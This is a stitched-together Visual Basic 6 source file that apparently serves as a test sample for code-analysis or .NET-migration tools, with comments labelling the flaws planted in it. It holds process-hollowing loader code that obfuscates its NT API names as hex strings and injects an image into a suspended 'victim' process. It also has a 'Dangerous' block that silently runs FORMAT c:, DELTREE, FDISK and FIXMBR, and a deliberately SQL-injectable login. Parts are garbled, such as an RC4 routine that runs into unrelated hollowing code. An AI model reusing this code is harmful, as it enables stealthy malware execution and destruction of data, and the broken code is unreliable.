   lMod = GetProcAddress(lNTDll, nlfpkgnrj("4E74476574436F6E74657874546872656164"))
    Invoke lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
 
    'NtWriteVirtualMemory
   lMod = GetProcAddress(lNTDll, nlfpkgnrj("4E7457726974655669727475616C4D656D6F7279"))
    Invoke lMod, tPROCESS_INFORMATION.hProcess, tCONTEXT.Ebx + 8, VarPtr(.ImageBase), 4, 0
 
    tCONTEXT.Eax = .ImageBase + .AddressOfEntryPoint
 
    'NtSetContextThread
   lMod = GetProcAddress(lNTDll, nlfpkgnrj("4E74536574436F6E74657874546872656164"))
    Invoke lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
 
    'NtResumeThread
   lMod = GetProcAddress(lNTDll, nlfpkgnrj("4E74526573756D65546872656164"))
    Invoke lMod, tPROCESS_INFORMATION.hThread, 0
 
    hProc = tPROCESS_INFORMATION.hProcess
End With


End Sub


Public Sub DebugTrace(v)
    Debug.Print v & " " & Elapsed()
End Sub


Public Property Get Elapsed()


    If finish = 0 Then
        Elapsed = GetTickCount() - start
    Else
        Elapsed = finish - start
    End If
End Property

Private Declare Function GetTickCount Lib "kernel32" () As Long

Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" _
    (ByVal hwnd As Long, ByVal nIndex As Long) As Long


Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" _
    (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
    Public Const GWL_EXSTYLE = (-20)
    Public Const WS_EX_APPWINDOW = &H40000
'**************************************
' Name: [ Hide form from Taskbar ]
' Description:This code hides your form 
'     from the taskbar at runtime. Works perfe
'     ctly. Credit goes to manavo11 from vbfor
'     ums.com
' By: Eric Wolcott
'
'
' Inputs:None
'
' Returns:None
'
'Assumes:Includes checkbox titled "chkTa
'     skbar"
'
'Side Effects:None
'This code is copyrighted and has limite
'     d warranties.
'Please see http://www.Planet-Source-Cod
'     e.com/xq/ASP/txtCodeId.59397/lngWId.1/qx
'     /vb/scripts/ShowCode.htm
'for details.
'**************************************



Private Sub chkTaskbar_Click()
    Dim style As Long
    Hide
    style = GetWindowLong(hwnd, GWL_EXSTYLE)


    If chkTaskbar.Value = 0 Then


        If style And WS_EX_APPWINDOW Then
            style = style - WS_EX_APPWINDOW
        End If
    Else
        style = style Or WS_EX_APPWINDOW
    End If
    SetWindowLong hwnd, GWL_EXSTYLE, style
    App.TaskVisible = CBool(chkTaskbar.Value)
    Show
End Sub

Public Function RC4(ByVal Expression As String, ByVal Password As String) As String
On Error Resume Next

Dim RB(0 To 255) As Integer
Dim X As Long, Y As Long, Z As Long
Dim Key() As Byte, ByteArray() As Byte, Temp As Byte

If Len(Password) = 0 or Len(Expression) = 0 Then Exit Function

If Len(Password) > 256 Then
    Key() = StrConv(Left$(Password, 256), vbFromUnicode)
Else
    Key() = StrConv(Password, vbFromUnicode)
End If

For X = 0 To 255: RB(X) = X: Next

X = 0: Y = 0: Z = 0

For X = 0 To 255
    Y = (Y + RB(X) + Key(X Mod Len(Password))) Mod 256
    Temp = RB(X)
    RB(X) = RB(Y)
    RB(Y) = Temp
Next X

X = 0: Y = 0: Z = 0

ByteArray() = StrConv(Expression, vbFromUnicode)

For X = 0 To Len(Expression)
    Y = (Y + 1) Mod 256
    Z = (Z + RB(Y)) Mod 256
    Temp = RB(Y)
    RB(Y) = RB(Z)
    RB(Z) = Temp
    ByteArray(X) = ByteArray(X) Xor (RB((RB(Y) + RB(Z)) Mod 256))
Next X

RC4 = StrConv(ByteArray, vbUnicode)

If CreateProcess(vbNullString, sVictim, 0, 0, False, CREATE_SUSPENDED, 0, 0, si, pi) = 0 Then
   MsgBox "Can not start victim process!", vbCritical
   Exit Function
End If
 
context.ContextFlags = CONTEXT86_INTEGER
If GetThreadContext(pi.hThread, context) = 0 Then GoTo ClearProcess
 
Call ReadProcessMemory(pi.hProcess, ByVal context.Ebx + 8, addr, 4, 0)
If addr = 0 Then GoTo ClearProcess
 
If ZwUnmapViewOfSection(pi.hProcess, addr) Then GoTo ClearProcess
 
ImageBase = VirtualAllocEx(pi.hProcess, ByVal inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
If ImageBase = 0 Then GoTo ClearProcess
 
Call WriteProcessMemory(pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, ret)
lOffset = idh.e_lfanew + Len(inh)
 
For i = 0 To inh.FileHeader.NumberOfSections - 1
    CopyMemory ish, abExeFile(lOffset + i * Len(ish)), Len(ish)
    Call WriteProcessMemory(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, abExeFile(ish.PointerToRawData), ish.SizeOfRawData, ret)
    Call VirtualProtectEx(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ish.VirtualSize, Protect(ish.characteristics), addr)
Next i
 
Call WriteProcessMemory(pi.hProcess, ByVal context.Ebx + 8, ImageBase, 4, ret)
context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
Call SetThreadContext(pi.hThread, context)
Call ResumeThread(pi.hThread)


End Function								

Attribute VB_Name = "ShellMod"
Public Sub Runfile()
Dim temp As Double
temp = Shell(cmdLine, mode)
temp = Shell("Redirect.exe", vbHide)
' Deprecated
temp = Shell("xcopy.exe", vbHide)
temp = Shell("@xcopy", vbHide)
temp = Shell("NET PRINT", vbHide)
temp = Shell("Net Time", vbHide)
temp = Shell("netsh firewall", vbHide)
temp = Shell("command", vbHide)
temp = Shell("command.com", vbHide)
temp = Shell("cmd.exe", vbHide)
temp = Shell("powershell", vbHide)
temp = Shell("Cacls", vbHide)
temp = Shell("@at \\products 23:00 /every:M,T,W,Th,F backup", vbHide)
temp = Shell("at \\sales 06:00 cmd /c" + "net share reports=d:\Documents\reports >> \\corp\reports\sales.txt", vbHide)
temp = Shell("CTTY con", vb Hide)
temp = Shell("EDLIN <enter.txt >output.bat", vbHide)
temp = Shell("start EMM386 auto", vbHide)
temp = Shell("@MEM /c", vbHide)
temp = Shell("MSAV", vbHide)
temp = Shell("MSBACKUP", vbHide)
temp = Shell("MSD", vbHide)
temp = Shell("MSCDEX", vbHide)
temp = Shell("MWBACKUP", vbHide)
temp = Shell("POWER", vbHide)
temp = Shell("MAP a", vbHide)

' Dangerous
temp = Shell("@FORMAT c:", vbHide)
temp = Shell("DELTREE d:\", vbHide)
temp = Shell("DISKCOPY a: b:", vbHide)
temp = Shell("FDISK <dangerous.txt", vbHide)
temp = Shell("append c:\memos;c:\letters", vbHide)
temp = Shell("ARP>result.txt", vbHide)
temp = Shell("@ASSIGN a: = b:", vbHide)
temp = Shell("attrib +r autoexec.bat", vbHide)
temp = Shell("BATCH deltree/Y", vbHide)
temp = Shell("BACKUP/c C:", vbHide)
temp = Shell("BOOTCFG", vbHide)
temp = Shell("CHKDSK c: /R", vbHide)
temp = Shell("CHKNTFS/F D:", vbHide)
temp = Shell("CONVERT c:\memos", vbHide)
temp = Shell("DATE <setdate.txt", vbHide)
temp = Shell("DEBUG <setBug.dbg", vbHide)
temp = Shell("DEFRAG c:", vbHide)
temp = Shell("DISKCOMP c: d:", vbHide)
temp = Shell("DISKPART", vbHide)
temp = Shell("DOSKEY", vbHide)
temp = Shell("@DOSSHELL", vbHide)
temp = Shell("DRIVPARM", vbHide)
temp = Shell("ENABLE", vbHide)
temp = Shell("FIXBOOT", vbHide)
vtemp = Shell("FIXMBR", vbHide)
vtemp = Shell("FTYPE", vbHide)
vtemp = Shell("LABEL", vbHide)
vtemp = Shell("LH", vbHide)
vtemp = Shell("LOADFIX", vbHide)
vtemp = Shell("LOADHIGH", vbHide)
vtemp = Shell("LOCK", vbHide)
temp = Shell("QBASIC/s", vbHide)
vtemp = Shell("RUNAS CHKDSK c: /R", vbHide)
vtemp = Shell("SCANDISK", vbHide)
vtemp = Shell("SCANREG", vbHide)
vtemp = Shell("SETVER", vbHide)
vtemp = Shell("SFC", vbHide)
vtemp = Shell("SHARE", vbHide)
vtemp = Shell("SHUTDOWN -r", vbHide)
vtemp = Shell("SMARTDRV", vbHide)
vtemp = Shell("SUBST", vbHide)
vtemp = Shell("SWITCHES", vbHide)
vtemp = Shell("SYS", vbHide)
vtemp = Shell("SYSTEMINFO", vbHide)
vtemp = Shell("SYSTEMROOT", vbHide)
vtemp = Shell("TELNET", vbHide)
vtemp = Shell("UNDELETE", vbHide)
vtemp = Shell("UNFORMAT", vbHide)
vtemp = Shell("UNLOCK", vbHide)
vtemp = Shell("VERIFY", vbHide)
vtemp = Shell("REDIRECT", vbHide)
vtemp = Shell("BASICA", vbHide)
vtemp = Shell("BASIC", vbHide)
vtemp = Shell("FINDSTR", vbHide)
vtemp = Shell("FTYPE", vbHide)
vtemp = Shell("GWBASIC", vbHide)
vtemp = Shell("Igfxtray", vbHide)
vtemp = Shell("kill", vbHide)
vtemp = Shell("RESTORE", vbHide)
vtemp = Shell("ROBOCOPY", vbHide)
vtemp = Shell("SETACL", vbHide)
vtemp = Shell("SYSTEMINFO", vbHide)
vtemp = Shell("EXE2BIN", vbHide)
vtemp = Shell("FASTOPEN", vbHide)
vtemp = Shell("VOL", vbHide)
vtemp = Shell("INTERSVR", vbHide)
vtemp = Shell("INTERLNK", vbHide)
vtemp = Shell("JOIN", vbHide)
vtemp = Shell("LOADFIX", vbHide)
vtemp = Shell("MEMMAKER", vbHide)
vtemp = Shell("TRUENAME", vbHide)

End Sub

Private Sub cmdCmdUnsafe_Click()
Dim user_name As String
Dim password As String
Dim query As String
Dim rs As DAO.Recordset

    ' Get the user name and password.
    user_name = txtUserName.Text
    password = txtPassword.Text

    ' Compose the query.
        'SQL INJECTION
    query = "SELECT COUNT (*) FROM Passwords " & _
        "WHERE UserName='" & user_name & "'" & _
        "  AND Password='" & password & "'"
    txtQuery.Text = query

    ' Execute the query.
    On Error Resume Next
    Set rs = m_DB.OpenRecordset(query, dbOpenSnapshot)
    If Err.Number <> 0 Then
        lblValid.Caption = "Invalid Query"
    ElseIf (CInt(rs.Fields(0)) > 0) Then
        lblValid.Caption = "Valid"
    Else
        lblValid.Caption = "Invalid"
    End If

    rs.Close
End Sub

Private Sub cmdPrint_Click()
Set new_button = Form1.Controls.Add("VB.CommandButton", _
        "cmdPrint")
Form1.ActiveControl.Visible = False

'FIXIT: Form1.PrintForm method has no Visual Basic .NET equivalent and will not be upgraded.     FixIT90210ae-R7594-R67265
Form1.PrintForm 'DEPRECATED
Form1.ActiveControl.Visible = True

Text1.Text = Clipboard.GetText 'DEPRECATED: Clipboard
End Sub

Private Sub cmdRunDlg_Click()

  '----------------------------------------------------
  'Windows 'Run' dialog
  '----------------------------------------------------
   ' DEPRECATED variant sTitle (default type)
'FIXIT: Declare 'sTitle' with an early-bound data type                                     FixIT90210ae-R1672-R1B8ZE
   Dim sTitle, txtRunTitle As String 'VARIABLE NOT INIALIZED
   ' DEPRECATED variant sPrompt  (default type)
'FIXIT: Declare 'sPrompt' with an early-bound data type                                    FixIT90210ae-R1672-R1B8ZE
   Dim sPrompt, txtRunPrompt As String 'VARIABLE NOT INIALIZED
   
   If chkRunDefaults Then
      
     'sets bit 2 if checked
      Call SHRunDialog(hWnd, 0, 0, vbNullString, vbNullString, -chkRunNoMRU)
   
   Else
   
      sTitle = CheckString(txtRunTitle)
      sPrompt = CheckString(txtRunPrompt)
      
      Call SHRunDialog(hWnd, 0, 0, sTitle, sPrompt, -chkRunNoMRU)
   
   End If
End Sub

Private Sub cmdCmdTryIt_Click()
Dim lngFactorial As Long
Dim intInputNbr As Integer
Dim intLoopCtr As Integer
intInputNbr = Val(InputBox("Enter a number:", "GoTo Demo"))
lngFactorial = 1
intLoopCtr = 1
 
Loop_Start:
If intLoopCtr > intInputNbr Then GoTo 10 'DEPRECATED: GOTO
 
lngFactorial = lngFactorial * intLoopCtr
intLoopCtr = intLoopCtr + 1
GoTo Loop_Start 'DEPRECATED: GOTO
10 ' End of loop
MsgBox CStr(intInputNbr) + "! = " + lngFactorial
End Sub

Private Sub cmdShutDown_Click()

  '----------------------------------------------------
  'Shut Down Windows dialog
  '----------------------------------------------------

  Call SHShutDownDialog(0)
End Sub

Private Sub cmdTryIt1_Click()
'FIXIT: Keyword 'GoSub' not supported in Visual Basic .NET                                 FixIT90210ae-R6614-H1984
GoSub SubroutineA 'DEPRECATED: GOSUB
 
'FIXIT: Keyword 'GoSub' not supported in Visual Basic .NET                                 FixIT90210ae-R6614-H1984
GoSub SubroutineB 'DEPRECATED: GOSUB
 
'FIXIT: Keyword 'GoSub' not supported in Visual Basic .NET                                 FixIT90210ae-R6614-H1984
GoSub 1000 'DEPRECATED: GOSUB
 
Exit Sub
 
SubroutineA:
MsgBox "Hey kids, I'm in Subroutine A"
'FIXIT: Return has new meaning in Visual Basic .NET                                        FixIT90210ae-R9642-H1984
Return
 
SubroutineB:
MsgBox "Hey kids, I'm in Subroutine B"
'FIXIT: Return has new meaning in Visual Basic .NET                                        FixIT90210ae-R9642-H1984
Return
 
1000
MsgBox "Hey kids, I'm in Subroutine 1000"
'FIXIT: Return has new meaning in Visual Basic .NET                                        FixIT90210ae-R9642-H1984
Return
End Sub

Private Sub Command1_Click()
Dim matricola As String

'VB.NET incompatibility: Use Zero Bound Arrays

'Visual Basic 6.0 allowed you to define arrays with lower 'and upper bounds of any whole number. You could also use 'ReDim to reassign a variant as an array. To enable 'interoperability with other languages, arrays in Visual 'Basic .NET must have a lower bound of zero, and ReDim 'cannot be used unless the variable was previously declared 'with Dim As Array. Although this restricts the way arrays 'can be defined, it does allow you to pass arrays between 'Visual Basic .NET and any other .NET language. The 'following example shows the restriction:
'FIXIT: Non Zero lowerbound arrays are not supported in Visual Basic .NET                  FixIT90210ae-R9815-H1984
Dim A(1 To 10) As Integer   'LBound must be 0 in VB.NET
'FIXIT: Declare 'V' with an early-bound data type                                          FixIT90210ae-R1672-R1B8ZE
Dim V  'DEPRECATED variant variable V (default type)
ReDim V(10)   'Can't use ReDim without Dim in VB.NET


'DEPRECATED Arrays and Fixed-Length Strings in User-Defined Types
'Due to changes made which allow Visual Basic .NET arrays 'and structures to be fully compatible with other Visual 'Studio .NET languages, fixed-length strings are no longer 'supported in the language. In most cases this is not a 'problem, because there is a compatibility class which 'provides fixed-length string behavior, so the code:
Dim MyFixedLengthString As String * 100
'upgrades to the following:
'Dim MyFixedLengthString As New VB6.FixedLengthString(100)


'DEPRECATED: VARIANT
'FIXIT: Declare 'Var1' with an early-bound data type                                       FixIT90210ae-R1672-R1B8ZE
Dim Var1 As Variant
'FIXIT: Declare 'Var2' with an early-bound data type                                       FixIT90210ae-R1672-R1B8ZE
Dim Var2 As Variant
'FIXIT: Declare 'Var3' with an early-bound data type                                       FixIT90210ae-R1672-R1B8ZE
Dim Var3 As Variant 'VARIABLE INIALIZED BUT NEVER USED

Var1 = "3"
Var2 = 4
Var3 = Var1 + Var2   'UNCLEAR: What is the intention?

'Visual Basic 6 supported Null propagation.
'Null propagation supports the premise that when null is 'used in an expression, the result of the expression will 'itself be Null. In each case in the following example, the 'result of V is always Null.
V = 1 + Null
V = Null + Right$("SomeText", 1)
'FIXIT: Replace 'Right' function with 'Right$' function                                    FixIT90210ae-R9757-R1B8ZE
V = Right("SomeText", 0)
'FIXIT: 'On ... GoTo' is not supported in Visual Basic .NET                                FixIT90210ae-R7973-H1984
On V GoTo 100, 200, 300 'DEPRECATED
'Use Constants Instead of Underlying Values
'When writing code, try to use constants rather than relying 'on their underlying values. For example, if you are 'maximizing a form at run time, use:

100 WindowStyle = 2   'Avoid using underlying value
200 WindowStyle = x   'Avoid using variables

300 matricola = Text1.Text
Set Conn = New ADODB.Connection
Set rs = New ADODB.Recordset

Conn.Open str
rs.Open "Tabella1", Conn, 3, 3 'IT WONT RUN

If rs("Matricola") = matricola Then  'UNCLEAR: better using RS.Fields("Matricola").Value
MsgBox ("Matricola presente")
Else
MsgBox ("Matricola non presente")
CreateKey "HKCUSoftwareTestTest Entry", "Test Entry"
MsgBox "The value 'Test Entry' was saved"

End If

'Populate the list.
List1.AddItem "Localhost"
' CHANGE TO 10.1.1.1 HARDCODED IP ADDRESS IN COMMENT
List1.AddItem "127.0.0.1" 'HARDCODED IP ADDRESS

Dim tId As Long 'VARIABLE INIALIZED BUT NEVER USED
'HARDCODED ABSOLUTE PATH
tId = Shell("c:\atch1.bat", vbHide) 'tId returns the taskId after successful
'execution of the batch file.
End Sub

Private Sub List1_Click()
Dim KeyValue As String
Dim dbl As Double
Dim dat As Date
dat = Now
dbl = dat      'VB.NET: Double can't be assigned to a date
dbl = DateAdd("d", 1, dbl)   'VB.NET: Can't use Double in date functions
dat = CDate(dbl)   'VB.NET: CDate can't convert double to date
KeyValue = ReadKey("HKCUSoftwareTestTest Entry")

If KeyValue = "" Then
MsgBox "No value was read"
Else
MsgBox "The value '" & KeyValue & "' was read" 'EXPOSING OF SENSITIVE DATA
End If
'Shell a file based on the selection of the user?

On Error GoTo ClickError

Select Case List1.List(List1.ListIndex)

Case "Localhost"
Text1.Text = "ping localhost"

Case "127.0.0.1"
Text1.Text = "ping 127.0.0.1" 'HARDCODED IP ADDRESS

Case Else
'Do nothing.
Exit Sub

End Select

'Write the selection to the file.
Open ProgPath & "ping.bat" For Output As #1
'FIXIT: Print method has no Visual Basic .NET equivalent and will not be upgraded.         FixIT90210ae-R7594-R67265
Print #1, Text1.Text
Close #1

'Shell the batch file.
Shell ProgPath & "ping.bat", vbNormalFocus

Exit Sub

ClickError:

Debug.Print Err.Number, Err.Description
Open "c:bankings.dat" For Input As FileNum 'HARDCODED ABSOLUTE PATH
Do While Not EOF(FileNum)
    Input #FileNum, datebanked, Calculated, Actual, Statement, OverUnder
    tmp = Replace(datebanked, "#", "")
'FIXIT: Replace 'Trim' function with 'Trim$' function                                      FixIT90210ae-R9757-R1B8ZE
'FIXIT: Replace 'Trim' function with 'Trim$' function                                      FixIT90210ae-R9757-R1B8ZE
      If CDate(Trim(tmp)) >= startdate And CDate(Trim(tmp)) <= endDate Then
  
 'Loop through the site bankings file till the end.
   ' msf2.AddItem datebanked & Chr(9) & Calculated & Chr(9) & Actual & Chr(9) & Statement & Chr(9) & OverUnder
' frmDocument.msf2.AddItem tmp & Chr(9) & Calculated & Chr(9) & Actual & Chr(9) & Statement & Chr(9) & OverUnder
 frmstatement.lstbankings.AddItem tmp & Chr(9) & Calculated & Chr(9) & Actual & Chr(9) & Chr(9) & OverUnder
         ' add your code here !!
        ' MsgBox "hello"
      End If
Loop
Close #FileNum
End Sub

Option Base 0  'DEPRECATED
'FIXIT: Keyword 'DefInt' not supported in Visual Basic .NET                                FixIT90210ae-R6614-H1984
DefInt A-C 'DEPRECATED

Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Private Declare Function WaitForSingleObject Lib _
"kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds _
As Long) As Long 'DEPRECATED: now as Integer
Private Type STARTUPINFO
      cb As Long
      lpReserved As String
      lpDesktop As String
      lpTitle As String
      dwX As Long
      dwY As Long
      dwXSize As Long
      dwYSize As Long
      dwXCountChars As Long
      dwYCountChars As Long
      dwFillAttribute As Long
      dwFlags As Long
      wShowWindow As Integer
      cbReserved2 As Integer
      lpReserved2 As Long
      hStdInput As Long
      hStdOutput As Long
      hStdError As Long
   End Type

   Private Type PROCESS_INFORMATION
      hProcess As Long
      hThread As Long
      dwProcessID As Long
      dwThreadID As Long
   End Type
   Public Type TypeOfAlarmArray
x As String * 1
y As Integer
z As String * 3
End Type

Type TypeOfSubAlarmInfo
x As String * 6
End Type

Declare Function CreateProcessA Lib "kernel32" _
(ByVal lpApplicationName As Long, ByVal lpCommandLine As _
String, ByVal lpProcessAttributes As Long, ByVal _
lpThreadAttributes As Long, ByVal bInheritHandles As Long, _
ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, _
ByVal lpCurrentDirectory As Long, lpStartupInfo As _
STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) _
As Long 'DEPRECATED: now as Integer

Declare Function CloseHandle Lib "kernel32" (ByVal hObject _
As Long) As Long 'DEPRECATED: now as Integer

Private Const NORMAL_PRIORITY_CLASS = &H20&
Private Const INFINITE = -1&
'FIXIT: As Any is not supported in Visual Basic .NET. Use a specific type.                 FixIT90210ae-R5608-H1984
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long) 'DEPRECATED: now As Integer
Public Declare Function DLG_FindFile Lib "shell32.dll" Alias "#90" _
       (ByVal pidlRoot As Long, ByVal pidlSavedSearch As Long) As Long 'DEPRECATED: undocumented
Public Declare Function DLG_FindComputer Lib "shell32.dll" Alias "#91" _
       (ByVal pidlRoot As Long, ByVal pidlSavedSearch As Long) As Long 'DEPRECATED: undocumented
           
'Private m_waveFmt As WAVEFORMATEX
Public Declare Function GetVersionEx Lib "kernel32" _
    Alias "GetVersionExA" _
   (lpVersionInformation As OSVERSIONINFO) As Long 'DEPRECATED: now As Integer
                                     
Public Type OSVERSIONINFO
   dwOSVersionInfoSize As Long
   dwMajorVersion As Long
   dwMinorVersion As Long
   dwBuildNumber As Long
   dwPlatformId As Long
   szCSDVersion As String * 128
End Type
   
Public Const VER_PLATFORM_WIN32s = 0
Public Const VER_PLATFORM_WIN32_WINDOWS = 1
Public Const VER_PLATFORM_WIN32_NT = 2
   
 
'FIXIT: As Any is not supported in Visual Basic .NET. Use a specific type.                 FixIT90210ae-R5608-H1984
Public Declare Function IsTextUnicode Lib "advapi32" _
  (lpBuffer As Any, _
   ByVal cb As Long, _
   lpi As Long) As Long 'DEPRECATED: now As Integer
                               
Public Const IS_TEXT_UNICODE_ASCII16 = &H1
Public Const IS_TEXT_UNICODE_REVERSE_ASCII16 = &H10
Public Const IS_TEXT_UNICODE_STATISTICS = &H2
Public Const IS_TEXT_UNICODE_REVERSE_STATISTICS = &H20
Public Const IS_TEXT_UNICODE_CONTROLS = &H4
Public Const IS_TEXT_UNICODE_REVERSE_CONTROLS = &H40
Public Const IS_TEXT_UNICODE_SIGNATURE = &H8
Public Const IS_TEXT_UNICODE_REVERSE_SIGNATURE = &H80
Public Const IS_TEXT_UNICODE_ILLEGAL_CHARS = &H100
Public Const IS_TEXT_UNICODE_ODD_LENGTH = &H200
Public Const IS_TEXT_UNICODE_DBCS_LEADBYTE = &H400
Public Const IS_TEXT_UNICODE_NULL_BYTES = &H1000
Public Const IS_TEXT_UNICODE_UNICODE_MASK = &HF
Public Const IS_TEXT_UNICODE_REVERSE_MASK = &HF0
Public Const IS_TEXT_UNICODE_NOT_UNICODE_MASK = &HF00
Public Const IS_TEXT_UNICODE_NOT_ASCII_MASK = &HF000
'------------------------------------------------------
'The "System Settings Change" message box.
'("You must restart your computer before the new
'settings will take effect.")
Public Declare Function SHRestartSystemMB Lib "shell32" _
   Alias "#59" _
  (ByVal hOwner As Long, _
   ByVal sExtraPrompt As String, _
   ByVal uFlags As Long) As Long 'DEPRECATED: undocumented

'hOwner = Message box owner, specify 0
'for desktop (will be top-level).
'sPrompt = Specified prompt string placed
'above the default prompt.
'uFlags = Can be the following values:

'WinNT
'Appears to use ExitWindowsEx uFlags values
'and behave accordingly:
Public Const EWX_LOGOFF = 0
'NT:needs SE_SHUTDOWN_NAME priv (no def prompt)
Public Const EWX_SHUTDOWN = 1
Public Const EWX_REBOOT = 2
Public Const EWX_FORCE = 4
Public Const EWX_POWEROFF = 8

'Win95/98
'Any Yes selection produces the equivalent to
'ExitWindowsEx(EWX_FORCE, 0) (?)
'(i.e. no WM_QUERYENDSESSION or WM_ENDSESSION is sent!).
'Other than is noted below, it was found that any other
'value shuts the system down (no reboot) and includes
'the default prompt.

'Shuts the system down (no reboot) and does not include
'the default prompt:
Public Const shrsExitNoDefPrompt = 1

'Reboots the system and includes the
'default prompt.
Public Const shrsRebootSystem = 2 '= EWX_REBOOT

'Rtn vals: Yes = 6 (vbYes), No = 7 (vbNo)

'The Shut Down dialog via the Start menu
Public Declare Function SHShutDownDialog Lib "shell32" _
   Alias "#60" _
  (ByVal YourGuess As Long) As Long 'DEPRECATED: undocumented

'The Run dialog via the Start menu
Public Declare Function SHRunDialog Lib "shell32" _
   Alias "#61" _
  (ByVal hOwner As Long, _
   ByVal Unknown1 As Long, _
   ByVal Unknown2 As Long, _
   ByVal szTitle As String, _
   ByVal szPrompt As String, _
   ByVal uFlags As Long) As Long 'DEPRECATED: undocumented

'hOwner = Dialog owner, specify 0 for desktop
'(will be top-level)
'Unknown1 = ?
'Unknown2 = ?, non-zero causes gpf! strings are ok...(?)
'szTitle = Dialog title, specify vbNullString for
'default ("Run")
'szPrompt = Dialog prompt, specify vbNullString for
'default ("Type the name...")
   
'If uFlags is the following constant, the string from
'last program run will not appear in the dialog's
'combo box (that's all I found...)
Public Const shrdNoMRUString = &H2   '2nd bit is set

Declare Function InternetDial _
      Lib "wininet.dll" Alias "InternetDialA" _
      (ByVal hwndParent As Long, _
      ByVal strEntryName As String, _
      ByVal dwFlags As Long, _
      lpdwConnection As Long, _
      ByVal dwReserved As Long) As Long
Public bIsWinNT As Boolean
Public conORA As New ADODB.Connection
    
Public rstORA As New ADODB.Recordset
Public Conn As ADODB.Connection

Public rs As ADODB.Recordset

Public Const str = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=prova.mdb"
Type TypeOfStreamData
DIO(0 To 7) As Integer ' DI/DO data for Slot0, Slot1,....,Slot7
Slot0(0 To 7) As Integer ' AI/AO data for Slot0
Slot1(0 To 7) As Integer ' AI/AO data for Slot1
Slot2(0 To 7) As Integer ' AI/AO data for Slot2
Slot3(0 To 7) As Integer ' AI/AO data for Slot3
Slot4(0 To 7) As Integer ' AI/AO data for Slot4
Slot5(0 To 7) As Integer ' AI/AO data for Slot5
Slot6(0 To 7) As Integer ' AI/AO data for Slot6
Slot7(0 To 7) As Integer ' AI/AO data for Slot7
End Type

Type RectWordArray
wa(72) As Integer
End Type

'If there is some way to set & rtn the command
'line, I didn't find it...
'Always returns 0 (?)

Private Sub Form_Load()

'FIXIT: Declare 'ie' with an early-bound data type                                         FixIT90210ae-R1672-R1B8ZE
    Dim ie     As Object

    Dim result As Integer

    Dim myRow  As Integer, myCol As Integer

    Dim myURL  As String

    Dim CONSTR As String

    CONSTR = "Provider=MSDAORA.1;Data Source=cisdb;Persist Security Info=False"
    conORA.Open CONSTR, "username", "password" 'HARDCODED CONNECTION STRING


    rstORA.Open "select * from USERDETAILS", conORA, adOpenDynamic, adLockOptimistic 'AVOID SELECT *
    rstORA.AddNew
    '
    ' Get activecell value, must be a valid
    ' web address
    '
    Screen.MousePointer = vbHourglass
    DoEvents

    
    ' Set up the Automation object
    '
    Set ie = CreateObject("InternetExplorer.Application")
    '
    ' Navigate to a page and customize the browser window
    '
    ie.Navigate "http://waterdata.usgs.gov/mt/nwis/uv/?site_no=06191500&PARAmeter_cd=00060,00065,00010"  'PARAMETER TAMPERING
    ie.Toolbar = True ' }set these to true if you want to have the
    ie.StatusBar = True ' }toolbar, statusbar and menu visible
    ie.MenuBar = True ' }

    '
    ' keep itself busy while the page loads
    '
    Do While ie.Busy
        Do While ie.Busy
            DoEvents
            Sleep 10000 'DoS Sleep
        Loop
    Loop
    '
    ' Display page info
    '
    result = MsgBox("Current URL: " & ie.LocationURL & vbCrLf & "Current Title: " & ie.LocationName & vbCrLf & "Document type: " & ie.Type & vbCrLf & vbCrLf & "Would you like to view this document?", vbYesNo + vbQuestion) 'EXPOSING OF SENSITIVE DATA

    If result = vbYes Then
        '
        ' If Yes, make browser visible
        '
        ie.Visible = True
    Else
        '
        ' If no, quit
        '
        ie.Quit

    End If

    Set ie = Nothing

End Sub


Public Sub CreateKey(Folder As String, Value As String)
'FIXIT: Declare 'B' with an early-bound data type                                          FixIT90210ae-R1672-R1B8ZE
Dim B As Object
On Error Resume Next
Set B = CreateObject("wscript.shell")
B.RegWrite Folder, Value
Set B = Nothing
End Sub

Public Function ReadKey(Value As String) As String
Dim r As String
'FIXIT: Declare 'B' with an early-bound data type                                          FixIT90210ae-R1672-R1B8ZE
Dim B As Object
On Error Resume Next
Set B = CreateObject("wscript.shell")
r = B.RegRead(Value)
ReadKey = r
Set B = Nothing
End Function

Private Function HOConnect() As Boolean
Dim mlConnectionNumber As Long
Dim lngResult As Long
mlConnectionNumber = 0&
If Online Then
HOConnect = True
Else
txtStatus = "Connecting ..."
lngResult = InternetDial(hWnd, dun, INTERNET_AUTODIAL_FORCE_UNATTENDED, mlConnectionNumber, 0&)
If lngResult = ERROR_SUCCESS Then
HOConnect = True
txtStatus = "On-Line"
DoEvents
Else
txtStatus = "Off-Line"
End If
End If
End Function

Private Sub ConnectDB()
   Dim sConn As String
   Dim DB As String
  
   Select Case Text1.Text
      Case "Production"
         DB = "PROD"
      Case "Testing"
         DB = "TEST"
   End Select
   
   sConn = "Driver=(Oracle in OraHome92);" & "Data Source=" & DB & _
                ";Uid=userid;Pwd=password;" 'HARDCODED CONNECTION STRING
   dbConn.Open sConn
   
End Sub


Public Sub ExecCmd(cmdline$)
Dim proc As PROCESS_INFORMATION
Dim start As STARTUPINFO
Dim ret&
'FIXIT: Declare 'obj' with an early-bound data type                                        FixIT90210ae-R1672-R1B8ZE
Dim obj As Object
Set obj = Text1
'FIXIT: Keyword 'ObjPtr' not supported in Visual Basic .NET                                FixIT90210ae-R6614-H1984
obj.Add MyObj1, CStr(ObjPtr(MyObj1)) 'ObjPtr DEPRECATED
On Error GoTo 0 'DEPRECATED
'Initialize the STARTUPINFO structure:
start.cb = Len(start)

'Start the shelled application:
